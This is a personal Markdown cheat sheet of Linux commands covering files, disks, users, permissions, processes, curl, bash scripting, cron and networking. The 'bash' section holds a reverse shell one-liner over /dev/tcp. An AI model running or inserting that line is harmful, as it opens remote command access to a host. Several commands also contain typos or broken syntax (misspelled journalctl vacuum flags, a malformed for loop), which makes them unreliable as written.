# Linux Commands

## Get system info

`uname` returns some useful information about the specific flavor of the OS and its kernel.

```bash
# -a for all information
uname -a 

# Get information about operating system
cat /etc/os-release
```

## ln

Create a hard link to my_file (the `inode` is exactly the same)

```bash
ln my_file hard_link
```

Create a soft link to my_file (the `inode` is not exactly the same)

```bash
ln -s my_file soft_link
```

## ls

```bash
# Reverse sort based on time and in long human-readable format
ls -ltrh

# Show recursively
ls -R

# Show the inode of files
ls -i
```

## Find

`find` shows everything in current directory

```bash
find . 
```

Here are some more useful commands and switches.

```bash
# Files that their name's are exactly "test"
find . -name 'test'

# Files that have a flag (ignore-case) in their names
find . -iname '*flag*'

# To define how deep it should go into directories
find /tmp/ -maxdepth 1 -group admin

# To find a path 
find . -path '*gateway\/api-*'
```

### Filter

You can filter the files when you are finding them based on different factors.

#### Based on type

```bash
# Search only between directories -type {d,f,l}
find . -iname '*flag*' -type d
```

#### Based on size 

```bash
# Set condition on file's size
find /var -iname '*tmp*' -size +1M -100M
```

#### Based on time

First part

- `a` - Access
- `c` - Status (like permission)
- `m` - Modify (Content)

Second part

- `min` - Minutes
- `time` - 24 Hour

```bash
# Files that have been modified under ./ in recent 30 minutes.
find . -mmin -30
```

#### Based on user and group

```bash
find /tmp/ -user amin
find /tmp/ -group amin

# You can not belongings to group or user
find /tmp/ -nouser amin
find /tmp/ -nogroup amin
find /tmp/ ! -user amin
```

### Execute command on the files

```bash
find . -mmin -3 -exec echo "this is file {}" \;
find . -mmin -3 -exec ls "{}" \;

# Execute the go fmt commmand on any go file except the ones in the vendor directory
find . -name '*.go' ! -path './vendor/*' -type f -exec go fmt {} \;

# Important operations have their own switch
find . -mmin -3 -ls
find . -mmin -3 -delete
```

## Locate

Locate is faster than `find`. It uses the `updatedb` and updates the database periodically. This command will search the phrase in the database.

```bash
sudo apt install plocate
# locate <FILE_NAME>
locate networking

# To update the updatedb
sudo updatedb
````

## Alias

```bash
'alias ll='ls -lh'
```

## grep

To search in the content of a file.

```bash
# Search a word in file
grep <WORD> <FILE>

# Search in all files and contents
grep -r flag *

# For non-sensetive
grep -i

# To exclude a word use -v 
grep -v something

# To show before and after a grep
cat something.txt | grep -B 5 -A 5 something

# Search between all files in current directory
# using regular expression and with line number.
grep -r -n -e ".*"  ./*

# Show the count 
grep -c funk words_alpha.txt

# Show all of the file names that contains the regex
grep -lr funk .

# grep this regex in all txt files
grep a *.txt
```

## egrep

`egrep` is an extended grep. It is equal to `grep -E`.

## Binaries

```bash
# To see human readble strings in binary files
strings <BINARY_FILE>
```

## lsblk

Show all of blocks

```bash
lsblk

# Show all columns
lsblk -O

# Show UUID in the table
lsblk -o +UUID
```

## fdisk

Show all of the partitions of a disk

```bash
# List all of partitions
fdisk /dev/sda -l
```

Start partitioning

```bash
fdisk /dev/sda
```

## mkfs

```bash
# Formatting to ex3 
mkfs -t ext3 /dev/sda1
# Calling /sbin/mkfs.ext3
mkfs.ext3 /dev/sda1
```

## mkswap

```bash
# Create a swap area
mkswap /dev/sda5
```

## blkid

```bash
# Show all blocks
blkid

# Get the UUID of a partition
blkid /dev/sda1
```

## List folders sizes

Sort files based on their sizes:

```bash
ll -hrl | sort -k 5n
```

##  df

Disk Storage Status (Disk free).

```bash
# Human readable
df -h

# Show the type of the filesystem
df -hT

# Show the status of iNode
df -i
```

## du

Disk Usage

```bash
# Print the usage of all files in the current directory
du -h

# Show the summary of disk usage in the root
du / -h -s
```

If you want to be more specific

```bash
# Calculate with a specific depth
du -h --max-depth 1
```

If you want to sort them, you can use the `sort` command.

```bash
du -hs * | sort -h
```

## fsck

Filesystem Check

```bash
fsck /dev/sda5

# Check everything that is necessary
fsck -A

# Do not execute anything
fsck -N
# Ask me each time
fsck -i
```

To see where are the current partitions you can see `/etc/fstab`.

## tune2fs

Get full information about a disk.

```bash
tune2fs -l /dev/sda5
```

## xfs

```bash
xfs_info

# Organizing the blocks
xfs_fsr
```

### ncdu 

An alternative for the `du` is the `ncdu`:
 
```bash
ncdu
```

## mount

Show all mount drives

```bash
mount
```

To mount a new disk.

```bash
mkdir /media/mydisk
touch /media/mydisk/mydisk_file

# It will overwrite the previous files
# `-t` you can define the disk type
mount /dev/vdb1 /media/mydisk/

# Mount using UUID
mount UUID=<DISK-UUID> /media/mydisk/
```

## umount

To un-mount a disk.

```bash
umount /media/mydisk
# or 
umount /dev/vdb1

# Lazy or Force mode
umount -l /dev/vdb1
umount -f /dev/vdb1
```

## Common tricks

To check if a bash script is correct or not without running it:

```bash
bash -n <script>
```

Use -p flag when you want to create nested folders. For example:

```bash
mkdir -p a/b/c/d/e/f/g
```

To calculate the duration of a command

```bash
time <YOUR_COMMMAND>
```

Copy multiple files in a specific location

```bash
sudo cp /tmp/{server.crt,ca.crt} /etc/openvpn/
```

Using `tee` you can save log of your commands

```bash
echo "amin" | tee test.log
```

To go to the previous directory

```bash
cd /etc
cd /var
# To go to the /etc again
# You can also use pushd and pod
# To go to previous path
cd -
```

Minimizing an app like vim into background

```bash
# To minimize app (background)
^Z 
# To go back to foreground again
fg
```

Run the most recent command

```bash
# Repeat the most recent command with sudo
sudo !!

# Run the most recent command that had `ping`
!ping
```

Run a command from the history. You can use the number to run it again.

```bash
# Show histories
history

# Execute the id=120
!120
```

To check whether the command is available or not.

```bash
if ! command -v <the_command> &> /dev/null
then
    echo "<the_command> could not be found"
    exit
fi
```

## column

To change junk output to clean formatted columns

```bash
mount | column -t
```

## pushd

To enter the directory by pushing the directory to the stack.

```bash
pushd /var
```

## popd

To enter the directory poping the directory from the stack.

```bash
popd
```

## bash

To create a reverse shell

```bash
bash -i >& /dev/tcp/<IP>/1337 0>&1
```

## time

To calculate the execution time of a command. 

```bash
time python3 main.py
```

## diff

To see the difference between the two files just use 

```bash
# If the files are just like each other the value of $? is 0
diff FILE1 FILE2

# To see more lines after and before changes
diff -u FILE1 FILE2
```

> You can install the colordiff to have colors

## Tree the folders 2 levels

```bash
tree -L 2 .
```

## Install DPKG dependencies

```bash
# First, install the DPKG
sudo dpkg -i package_with_unsatisfied_dependencies.deb

# Run this command to satisfy the dependencies
apt-get -f install
```

## Environment variables

Import environment variables from a file.

`set -a` causes variables defined from now on to be automatically exported. It's available in any Bourne-like shell. `.` is the standard and Bourne name for the `source` command so I prefer it for portability (`source` comes from `csh` and is now available in most modern Bourne-like shells including `bash` though (sometimes with a slightly different behavior)).

```bash
set -a
source ./tmp.txt
set +a
```

You can create a template file like bellow

```bash
Package: SPCU-Client
Version: $VERSION
Architecture: armhf
Maintainer: SPCUINC <Admin@spcuinc.com>
Description: A program managing IoT devices.
```

Then you can replace the environment variables to generate a new config file.

```bash
envsubst < "configs/control" > "build/spcu_client_1.0.0-1_armhf/DEBIAN/control"
```

When you want to use a default value for your env variable:

```bash
# Use the PGADMIN_DEFAULT_EMAIL variable or use "amin" if it is not set.` 
echo ${PGADMIN_DEFAULT_EMAIL:-amin}
```

You can use `source` command to execute a bash script for the running terminal session.

```bash
source my_bash_script.sh
```

## which

Show the path of a command.

```bash
which ping

# Get all 
which -a ping
```

## whereis

Show more information about the origin of a command.

```bash
whereis ping
```

## whatis

The first line of the man page.

```bash
whatis pings
```

## type

Show the type of command. Some of the commands like `cd` are shell built-in ones.

```bash
type cd
type ping
```

## rsync

```bash
# Verbose and archive mode
rsync -av /Volume/example .

# Simulate the rsync
rsync -av --dry-run --progress /Volume/example .

# With the progress bar
rsync -av --progress /Volume/example .

# To another server
rsync -av --progress /Volume/example root@139.177.195.158:
```

## xarg

It can take the output of a command and passes it as an argument for another command.

```bash
# To convert the muti-line output from ls command into a single line
ls | xargs
ls | xargs wc

# It's more flexiable to 
echo "hi there" | xargs -I DATA echo hi DATA there!

# Change xargs to expect NUL (``\0'') characters as separators
# Find & remove all directories with a special word
find Downloads -name "flag" -type d -print0 | xargs -0 /bin/rm -v -rf "{}"
```

## tee

```bash
# It also print on the stdout
ls -1 | tee allfiles myfiles
```

## ssh

You can use `ssh` to receive an interactive shell from another computer. 

To create a semi-automated-proxy

```bash
ssh -D 1080 192.168.1.2
```

To forward the X (Show UI of the program on the client side)

```bash
ssh -X 192.168.1.2
```

### ssh tunnels

You can also use port forwarding

```bash
# Port forwarding
# -f is used for running in background
# -L is for binding 
# -N not execute a remote command
ssh -N -f -L 8080:localhost:8080 ubuntu@os-playground1
```

You can use Remote forwarding

```bash
ssh -R 8080:localhost:80 root@5.5.5.5
```

## scp

You can use `scp` command to send files in terminal to other computers.

## screen

You may want to execute a long-running job on your virtual machine. The network connection can interrupt your ssh connection, and you lose the running task session in your terminal. In this situation, you can use something like Tmux.
Another tool is called Screen. 

```bash
# To create a new session with name
screen -S session_name

# To detach
# Press ^a + d

# List the sessions
screen -ls

# To restore a session
screen -r 51166
```

> You can customize your screen in `~/.screenrc` file.

At last, I think using tmux is better :))

## watch

You can use the `watch` command to watch the output of your command periodically.

```bash
# Default is 2 seconds
watch uptime

watch -n 1  "ls -lhf | grep Huawei | awk '{print \$5}'"

# Highlight the differences
watch -n 1 -d uptime

# Make sound if it has a non-zero exit
watch -n 1 ./run
```

## cat

A tool to concatenate input streams.

```bash
cat a.txt b.txt
```

> You can use `zcat`, `gzcat`, etc., to concatenate compressed files.
>    

## od

It shows files in formats other than text.

```bash
od t.txt

# To show readable characters
od -c t.txt
```

## split

You can split a big file into some smaller files using `split` command.

```bash
# -b for size
# -l for lines
# -n for chunks
split -n  10 h.zip h_ 
```

## nl

Add the line number to the input text.

```bash
nl t.txt

# You can use other commands too
cat -n t.txt
```

## sed

It is a command used for replacing and editing strings. For instance, look at this text:

```
# text.txt file
unix is great os. linux is opensource. unix is free os.
learn operating system.
unix linux which one you choose.
unix is easy to learn.linux is a multiuser os.Learn unix .unix is a powerful.
```

You can replace all of UNIX works to Linux by this command:

```bash
# `s` is for substitution
# The First one is the word going to be substituted
# The second word is the new work
# There are a bunch of flags like g that means global.
# You can use `2` for changing the second occurrence.
sed 's/unix/linux/g' geekfile.txt
```

### To show specific lines of a file

To get number of lines you can use

```bash
# Get lines 2 to 10
# Docs for `-n`: By default, each line of input is echoed to the standard output after all of the commands have been applied to it
sed -n '2,10p'

# Get lines 2 and 10 
sed -n '2p;10p'
```

## wc

To get the number of lines

```bash
# Word count
# [paragraphs] [words] [characters]
wc t.txt

# To get the number of lines
wc -l docker-compose-dev.yml 
```

## hashing

```bash
md5sum file.txt
sha256sum file.txt
sha512sum file.txt
```

## awk

```bash
# To get the first column of output
# which is separated by spaces.
awk -F ' ' '{print $1}'

# To print the exact previous output
awk '{print $0}' t.txt
```

## seq

Generates a sequence of numbers

```bash
# Generate numbers from 1 to 10
seq 1 10

# Generate numbers from 1 to 10 by 3
seq 1 3 10 
```

## cut

As it seems, It will cut the output as we want to.

```bash
# Let's assume we have a table and we want to cut them word by word and show the seconds words
minikube status | cut -w -f2

# Or you can deliminate the letter
# f2 shows the seconds part in each line 
minikube status | cut -d " " -f2

# field 1,2 and 4,5,6
minikube status | cut -d " " -f1,2,4-6
```

## head

```bash
# To get the 20 first character of a file
cat file | head --bytes 20
```

## sort

It sorts the input text string by different kinds of factors.

```bash
# If you want to sort a file in which a line has a number at the beginning.
sort -n the_file.txt
```

## unique

```bash
# To get the unique output
uniq t.txt

# To count each one of them
uniq -c t.txt

# To find words that are unique along the entire file.
uniq -u t.txt
```

> The `unique` can operate on files that have been sorted already.
> 

## paste

It merges the lines of the given files.

```bash
paste a.txt b.txt c.txt
```

## tr

It translates the characters to another character.

```bash
cat file.txt | tr '123456789' '۱۳۴۵۶۷۸۹۰'
```

## touch

```bash
# To create new empty file 
touch myfile.txt

# To change the time of the file (You can set -t for timestamp)
touch -t 200908121510.32

# Use reference with -r
touch -r /etc/debian_version myfile.txt
```

## truncate

Delete all of the contents of a file.

```bash
truncate -s 0 hello.txt
```

## File 

Windows files have an extention which specifies the type of the file. This is not safe because everybody can change the extention. In Linux, There is no `*.extention`.

```bash
# To get the type of the file
file filename.txt
```

## dd

It is a more advanced copy.

```bash
# To copy 100 1 byte block size from /dev/zero and put it in newfile
# You can test the result with `od` command
dd if=/dev/zero of=newfile count=100 bs=1
```

## Process management

### nice

It run a command with a specific niceness. 

```bash
# Show the default niceness
nice 

# Run ls with niceness 10
nice ls

# Run ls with niceness 14
nice -n 14 ls

# Run ls with niceness -14
sudo nice -n -14 ls
```

**Notice:** non-root user can not set negative niceness for their tasks.

### renice

It changes the niceness of a process.

```bash
renice -n 57890
```

## service

To See and Change the status of a service

```bash
service nginx status
service nginx stop 
service nginx start 
service nginx restart 
service nginx enable 
```

> Read more about `systemctl` and `service` in [this page](Systemctl.md).


## systemctl

To list all services

```bash
systemctl list-units --type=service
```

To See and Change the status of a service

```bash
systemctl status nginx
systemctl stop nginx
systemctl start nginx
systemctl restart nginx
systemctl enable nginx
```

> Read more about `systemctl` and `service` in [this page](Systemctl.md).

## journalctl

To show all the logs that have been sent to the `journald`.

```bash
journalctl

# Reverse the logs 
journalctl -r

# Go to the end of the logs
journalctl -e

# Keep showing the tail of logs
journalctl -f

# To see the last 10 lines
journalctl -n 10

# To show the kernel logs 
journalctl -k

# To filter only filter logs
journalctl -p err
journalctl -p info

# To show the logs of units in systemd.
journalctl -u ssh

# To set a time range
journalctl -u ssh --since yesterday --until "10 minutes ago"
```

> **Note**: You can configure the `journald` in `/etc/systemd/journald.conf`

### Boot logs in `journald`

To show the current boot logs

```bash
journalctl -b 0
```

To see the list of boots

```bash
journalctl --list-boots
```

### Delete some of logs

You need to use `vaccum` to delete some of the logs from `journald`.

```bash
# Delete all logs until 2 months ago
journalctl --vaccum-time=2months

# Eliminate all logs until the size of logs be 100mb
journalctl --vaccum-size=100M

# Eliminate all file logs to 2 files
journalctl --vaccum-file=2
```

### Check logs from a recovered system

You need to configure the path of log files to see the logs.

```bash
journalctl -D <PATH>
```

Or you can merge the logs with your `journald` logs

```bash
journalctl --merge <PATH>
```

## systemd-cat

It is used to manually send a log to the `journald`.

```bash
# Send a message with a info priority
echo "this is not an info log" | system-cat -p info
```

## getent

To get information about entries.

```bash
getent passwd newuser 
getent host localhost
```

## ulimit

`ulimit` is a built-in Linux shell command that allows viewing or limiting system resource amounts that individual users consume. Limiting resource usage is valuable in environments with multiple users and system performance issues.

```bash
# prints all of the user limits
ulimit -a
# Each program should not longer than 1s
ulimit -t 1
```

There are 2 types of resource limitation: “hard” and “soft”. Hard resource limit defines the physical limit that the user can reach. The “soft” resource limit is manageable by the user. Its value can go up to the “hard” limit.

> The system resources are defined in `cat /etc/security/limits.conf`.

## cal

A terminal based calendar

```bash
cal

# To see the next and previous months
cal -3

# To see the full calendar of a year
cal 1998
```

> **Note**: you can use `jcal` for Jalalli calendar

## date

To get information about date and time.

```bash
# Get the full date and time in default format
date

# You can specify a customized format
# %Y year
# %B name of the month
# %m the number of the month
# %d the number of the day in month
# %H the current hour
# %M the current minute

# To get the year and the name of month
date +'%Y %B'

# To change the date and time
sudo date -s "Jan 22 22:22:22 2022"
```

## timedatectl

To get some configurations about the timezone

```bash
timedatectl
```

> **Note**: There is usually a service called `NTP` that set the correct time based on the timezone.

## tzselect

To change the timezone of the system.

```bash
tzselect
```

For example, if you want to check the Tokyo time

```bash
# /etc/timezone
env TZ="Asia/Tokyo" date
```

You can also change your timezone by linking

```bash
sudo unlink /etc/localtime
sudo ln -s /usr/share/zoneinfo/Africa/Logos

```

## hwclock

To see the hardware clock

```bash
hwclock

# Change the hardware clock
hwclock --localtime --set --date="01/05/2023 22:22:22"
```

You can see the system time adjustment in `/etc/adjtime`.

## ntpdate

To check the time and date with the global time.

```bash
sudo ntpdate pool.ntp.org

# To update the system hardware time
sudo hwclock -w -u
```

## chronyc

```bash
# Show status of time confiugration
chronyc tracking

# Show the status
chronyc activity

# Show the sources
chronyc sources
```

## locale

To show the preferred language in each situation.

```bash
locale
```

You can use either these environment variables or `/etc/locale.conf` to change the settings.

## dmesg

To show the kernel ring buffer which contains the entire logs. These logs are based on seconds

```bash
dmesg
```

## last

To see the last successful logins

```bash
last

# To see the failed logins
lastb
```

## logger

```bash
# CTRL+D for the end of log
logger

# 
```

## iconv

To Convert the encoding to each other.

```bash
iconv -f windows-1258 -t UTF-8 /tmp/myfile.txt
```

## ldd

It shows the library of a executable

```bash
ldd /bin/executable
```

# User Management

## whoami

To see the logged-in user in Linux.

```bash
whoami
```

## id

To show the IDs of my user and groups.

```bash
id
```

The origin of these data is in the `/etc/passwd` and `/etc/group`. This command also shows the current group name and the one's that the user is a member of. You can change default group by `newgrp` command.

## useradd

You need to specify multiple flags to use this command. To add a new user account to the linux.

```bash
useradd newuser 

# -m creates a home directory for user
# -d specifies the path of the home directory
# -s specifies the user shell
# -G add user to a group
# -c add some comments for this account
# To create a specific directory for the user when you are creating the user
useradd -m -d /home/user1 user1
```

## adduser

It is more automated and interactive and ask some questions about the new user.

```bash
adduser newuser
```

## usermod

To modify the configurations of a linux user

```bash
# Change the shell for the user
usermod -s /bin/csh newuser

# Lock or unlock the user
usermod -L newuser
usermod -U newuser

# Add user to more group
usermod -aG sudo newuser
```

## userdel

To delete a user account in linux

```bash
userdel newuser

# To remove the home directory files
userdel -r newuser
```

## passwd

To change the password of a user

```bash
passwd user1

# Remove the password for a user
passwd -d user1
```

The details about each user is in `/etc/passwd`.

![Untitled](Linux%20Commands/passwd.png)

Passwords are saved in `/etc/shadow`.

![Untitled](Linux%20Commands/shadow.png)

## chage

To change password configuration for a user

```bash
chage newuser

# Show the details about password configurations
chage -l newuser
```

# Group Management 

![Untitled](Linux%20Commands/Untitled.png)

## groups

To show the groups that you are a member.

```bash
groups

# Alternatively
cat /etc/group
```

## groupadd

To create a new group

```bash
groupadd newgroup

# To specify the group ID
groupadd -g 1200 newgroup
```

## groupmod

To modify the configurations of a group

```bash
groupmod -g 500 newgroup
```

## groupdel

To delete a group

```bash
groupdel newgroup
```

## newgrp

To switch the default group.

```bash
newgrp cdrom
```

## su

Change the user

```bash
# Change to the root
su -
# Changet to the newuser
su newuser
```

### sudo

To see the list of user permissions

```bash
sudo -l
```

## last

To see the logs of users that logged into the system.

```bash
sudo last

# last failed logged in
sudo last -adF
```

## w

To see the users in the system.

```bash
w
```

## who

To see the users in the system.

```bash
who
```

# File Permissions and Ownership

## chmod

![Untitled](Linux%20Commands/file-permissions.png)

To change the file permissions by octal numbers

```bash
# The user can read, write, and execute it;
# Members of the group can read and execute it;
# Others may only read it.
chmod 754 myfile
```

You can add permission like execution 

```bash
# Add permission for the user
chmod u+rwx myfile

# Add permission for the group
chmod +x myfile

# Add multiple permissions
chmod u+rwx,g+rwx,o+rx myfile

# Remove multiple permissions
chmod u-x,g-x,o-x myfile
```

The operator **+** causes the selected file mode bits to be added to the existing file mode bits of each file; **-** causes them to be removed; and **=** causes them to be added and causes unmentioned bits to be removed except that a directory's unmentioned set user and group ID bits are not affected.

Another way is to

```bash
chmod u=rwx,g=rx,o=r myfile

# Find some files and change the permission
find /var/www/html -type f -exec chmod u=rw,go=r {} \;
```

If we want to change the permission of a directory recursively

```bash
chmod -R 755 directory_name
```

## chown

To change the owner of the directory or file

```bash
# Change the owner to the user amin and group amin
chown amin:amin myfile

# Recursively change the owner of files in a directory
chown -R user1 /shared_files
```

## chgrp

To change group ownership

```bash
# Change group of /u to staff
chgrp staff /u

# + With subfolders (recursively)
chgrp -hR staff /u
```

## umask

To see the `umask` number

```bash
umask

# To change the umask number
umask 0066
# You can also chnage it this way
umask u=rw,g=,o=
```

# Compression

## gzip

```bash
# To compress a file 
gzip you_file.txt

# To list details including the compress percentage
gzip -l you_file.txt.gz

# To uncompress
gzip -d you_file.txt.gz
gunzip file.gz
```

You can use gzip in `tar` command. To compress a directory with multiple files

```bash
# -z for gzip
tar -czvf files.gz files/
```

## Tar

`tar` is used for archiveing multiple files.

> ⚠️ You don't need to type `-` for switches.

### Create a new tar file

```bash
tar cf mytarfile.tar a.txt b.txt c.txt 
```

You can compress the give files while creating a new tar file.

- `z` - gzip
- `b` - bzip2

```bash
tar cfz mytarfile.tar.gzip a.txt b.txt c.txt
```

> ✍️ The `-r` option appends new files to the current available archive.

### Extract a tar file

To extract a `tar.gz` file, use the --extract (`-x`) option and specify the archive file name after the f option:

```bash
tar -xf archive.tar.gz
tar xf archive.tar.gz
```

> ✍️ The `-v` option will make the tar command more visible and print the names of the files being extracted on the terminal.

By default, tar will extract the archive contents in the current working directory. Use the `--directory` (`-C`) to extract archive files in a specific directory:

```bash
tar -xf archive.tar.gz -C /home/linuxize/files
```

When extracting files, you must provide their exact names, including the path, as printed by `--list` (`-t`).

Extracting one or more directories from an archive is the same as extracting files:

```bash
tar -xf archive.tar.gz dir1 dir2Copy
```

## 7za

```bash
# To list the file's contents
7za l file.zip

# To decompress the zip file
7za x file.zip
```

## cpio

```bash
# To create
ls | cpio -o > thefile.cpio

# To open the file
cpio -id < thefile.cpio
```

## ps

It's a flexible too for identifying programs running on the system.

```bash
# Show the processes
ps

# All Linux processes
ps -e

# Full information of processes
ps -ef 
ps -Af

# Show resources dedicated to the processes
ps -aux
```

### pgrep

To find a process between running processes

```bash
ps | grep eyes
pgrep eyes

# Kill all eyes processes
pgrep eyes | xargs kill
```

## Kill a process

```bash
sudo kill -9 423

# To kill a process on a specific port
sudo kill -9 $(sudo lsof -t -i:3000)
lsof -ti:8080 | xargs kill -9

# Kill all processes whose command is exactly `xeyes`
killall xeyes
# Kill all process that have a kind of command
pkill xeye
```

## Strace

If all you want to do is spy on the existing process, you can use `strace`.

```bash
# To see only data written to file descriptor 3 (`-e trace=` prevents the system calls from being loged).
strace -p1234 -e trace= -e write=3
```

## Jobs

```bash
# For see the procecess in the current session
# Jobs with `&` at the end mean running in background
jobs

# With process id
jobs -l
```

## Fg

To resume a job or process in the foreground

```bash
# Resume the last process (consider the `+` sign)
fg 

# Choose between multiple processes
fg %2
```

## Bg

To resume a job in the background

```bash
# Resume the last process (consider the `+` sign)
bg 

# Choose between multiple processes
bg %2
```

## Nohup

These foreground and background process are alive until the session is closed. If you want to keep them alive even if the parent are killed, you need to use `nohup`.

```bash
nohup xeyes
```

## Curl

To get the header of a request:

```bash
curl -I http://www.google.com/
```

Save the response in a output file:

```bash
curl -o google.com.html http://www.google.com/
```

Follow the link if it is moved permanently:

```bash
curl -L yahoo.com
```

For a get request:

```bash
curl -X GET <URL>
curl -i -H "Accept: application/json" -H "Content-Type: application/json" -X GET http://hostname/resource
```

To beautify the response you can:

```bash
echo $(curl -X GET http://localhost:8000/revert/minio/3/) | python -m json.tool
```

To pass data to the curl

```bash
curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data
```

You can also send a file using curl

```bash
curl -F 'uploadFile=@./xs.PNG' http://localhost:8080/upload
```

To send a gzip file with curl

```bash
curl -i -XPOST localhost:8080/orgs/8395a239-d09f-4427-927a-614022239859/devices/f365fbb2-56bf-4b4f-95e3-23cd1c9fc88a/apps/runner/logs -H'Content-Encoding : gzip' --data-binary @sentlog.gz
```

To get the status code from the curl you can use

```bash
status_code=$(curl -o /dev/null -s -w "%{http_code}" $1)
echo $status_code
```

You can pipe curl with `json_pp` to make it better

```bash
curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data | json_pp
```

To pass a cookie

```bash
curl -XGET --cookie "PHPSESSID=dgtvr4ef7k3jnm8bfmiobo9vm5" https://typhooncon-knowme.chals.io
```

To download a file

```bash
curl <FILE_URL> --output filename.jpg
```

## APT

You can edit the resources in this list. `/etc/apt/sources.list` and in any file with the suffix .list under the directory like `/etc/apt/sources.list.d/`

## Binwalk

Check the binary file to see if it is consisted of multiple binaries or not.

```bash
binwalk f.png
```

## Convert

To resize an image

```bash
# Resize
convert temp.png -resize x200 temp.png
```

## Magick

```bash
# To create new pictures or glue them to gether
magick montage -tile x1 -title "some title"  top.png
magick montage  -tile x4 -title "another one" temp.png bottom.png

# Glue them
magick montage -tile 1x top.png bottom.png -mode Concatenate
```

# Script

## Input

```bash
echo "What is your name?"
read name
# Read with a message
read -p "Enter the number: " num
# Read secure
read -sp "Enter the password: " num
# More variables
read name1 name2 name3 name4 name5
```

## Using basic operators

To increase a variable

```bash
i=0
i=$((i+1)) # i=1
```

## Conditions

```bash
read coffee
if [[ $coffee == "y" ]]; then
    echo "You're awesome."
elif [[ $USER == "bernard" ]]; then
    echo "Bernard always win this game."
else
    echo "Do nothing."
fi

# Set a timeout for the read
read -t 10 coffee
if [ $coffee -eq "y" ]; then
    echo "You're awesome."
elif [[ $USER == "bernard" ]]; then
    echo "Bernard always win this game."
else
    echo "Do nothing."
fi
```

Condition on file existence.

```bash
# File existance
if [ -r /var/the/file ]; then
    echo "It exists."
fi
```

## Switches

```bash
read class
case $class in
    1)
        type="A"
        ;;
    2)
        type="A"
        ;;
    3)
        type="A"
        ;;
esac
```

## For 

```bash
for index in 0 1 2 3 4; do
	newarr[$index]=${originalarr[4-$index]}
done

# Use sequences
for V in `seq 1 10`;
	echo $V;
done

# Use list of files
for f in `ls`;
	echo $f;
done

# Range of numbers
for index in {0..10}; do
	newarr[$index]=${originalarr[4-$index]}
done

# Or it can be some strings
for name in ; google.com facebook.com bing.com do
	ping $name
done

# Read from file
for index in $(cat cities.txt); do
	newarr[$index]=${originalarr[4-$index]}
done
```

## While

```bash
# While status code is not 200 continue to making requests
status_code=0
i=0
while [ $status_code -ne 200 ]
do
	status_code=$(curl -o /dev/null -s -w "%{http_code}" $1)
	echo "ret is: [$status_code]"
	((i ++))
done

# Loop through the lines of a file
while read p; do
  echo "$p"
done <peptides.txt

# To loop through lines of a command result
sudo docker container ls -a | grep pg | awk '{print $1}' | while read c; do
    sudo docker container rm -f $c
done
```

## Functions

```bash
function functionName() {
    # code
}

secondFunction() {
    # code
}
```

## Select 

```bash
choice="encrypt decrypt"
select option in $choice; do
	if [ $REPLY = 1 ]; then
		echo "Using encrypt"
	elif [ $REPLY = 2 ]; then
		echo "Using dencrypt"
	fi
done

# Output
# 1) encrypt
# 2) decrypt
# #? 1
# Using encrypt
# #? 2
# Using dencrypt
	
```

## Functions

```bash
read -p "Enter the number: " num

# Factorial
print_factorial() {
        counter=$1
        factorial=1
        while [ $counter -gt 0 ]; do
                factorial=$(( factorial * counter ))
                counter=$(( counter - 1 ))
        done
        echo "Factorial: " $factorial
}


# Aggregation
print_aggregation() {
        counter=$1
        aggr=0
        while [ $counter -gt 0 ]; do
                aggr=$(( aggr + counter))
                counter=$(( counter - 1 ))
        done
        echo "Aggregation: " $aggr
}

print_factorial $num 
print_aggregation $num 

```

## Arrays

```bash
# Create new array
newarr=()

# Read and save to an array
read -p "Enter 5 names: " name1 name2 name3 name4 name5
originalarr=($name1 $name2 $name3 $name4 $name5)

# Read and assign values
for index in 0 1 2 3 4; do
	newarr[$index]=${originalarr[4-$index]}
done

# Print everything inside an array
echo ${newarr[*]}
```

## Tips

To check the exit code and status of the last executed command.

```bash
if [ $? -eq 0 ]
then
  echo "Successfully created file"
else
  echo "Could not create file" >&2
  exit 1
fi
```

# Scheduling

## cron

To see the list of cron jobs for the user

```bash
crontab -l
```

To create or edit the cron jobs

```bash
crontab -e
```

For example, if you want to create a cronjob for `backup.sh` script which is run in the first day of the first month at 14:32, your configuration should be

```bash
32  14  1    1    *    /root/backup.sh
```

If you want to define some intervals you can use `/` character. For instance, if you want to run a job for each 15 minutes

```bash
*/15  */2   *    *    *    /root/backup.sh
```

> **Note**: The cron jobs are saved in `/var/spool/cron/`. There are some files which are named after usernames and contains the configuration of the cron jobs.

You can also specify the days with `,` characters

```bash
*/15  */2   *    *    1,2,3,4,5    /root/backup.sh
```

> **Note**: to maintain the logs of the commands you can use `>>` in command section for your cron jobs.

To set a cron job for another user

```bash
crontab –u other_username –e
```

## at

You can use this command to schedule some tasks for a specific time. To add a new job to run

```bash
at now + 3min
```

Then you enter the command you like to run one by one. By `CTRL+D` you can specify the end of the commands.

To see all the jobs

```bash
atq
```

To remove one of the jobs from the list

```bash
atrm 2
```

There are keywords you can use with `at`

- `now`: current time
- `teatime`: It is 4pm.
- `tomorrow`: exactly tomorrow this time
- `17:30`: 24-Hour format time

## systemd-timers

You can set this kind of timer with a file which is `service_name.timer` in which `service_name.service` is your target service.

```bash
[Unit]
Description=Daily rotation of log files
Documentation=man:logrotate(8) man:logrotate.conf(5)

[Timer]
OnCalendar=daily
AccuracySec=1h
Persistent=true

[Install]
WantedBy=timers.target
```

If you want to see your timers you can use 

```bash
systemctl list-timers

# For all timers use --all
systemctl list-timers --all
```

You need to activate a timer like a service to start the timer.

```bash
systemctl enable myservice.timer
systemctl start myservice.time

# Also do not forget to reload the daemon to apply the changes
systemctl daemon-reload
```

### systemd-run

You can temporary schedule a task using this command.

```bash
systemd-run --on-active="2minute" touch /tmp/chert
```

# Mail Management

## mail

To see the inbox for the current user

```bash
mail
```

Send a new email

```bash
mail amin

# You can schedule a command and send the result
echo -e "this is my command result" | mail -s "subject" "amin@x.com"
```

To see the MTA queue of current processing emails

```bash
mailq
```

# Network

> To see the common ports you can use `less /etc/services`

## ifconfig

> `ifconfig` is an old command compared to `ip`.

To enable/disable the interfaces

```bash
sudo ifconfig eth0 up
sudo ifconfig eth0 down
```

To get local IP addresses

```bash
sudo ifconfig
# Show interfaces that are even down
sudo ifconfig -a 
```

To change IP Addresses:

```bash
sudo ifconfig eth0 192.168.42.169 netmask 255.255.255.0
```

## ifup & ifdown

When manually changing your IP address, Linux automatically understands that you want to change from using a DHCP server to static IP addressing.

On Linux, changing your IP address using network utilities does not mean that your IP configuration will be saved on reboots. **In order to change your IP address on Linux, you will have to add your network configuration in the `/etc/network/interfaces` or create this file if it does not exist already.**

```bash
# Content of /etc/network/interfaces
iface eth0 inet static 
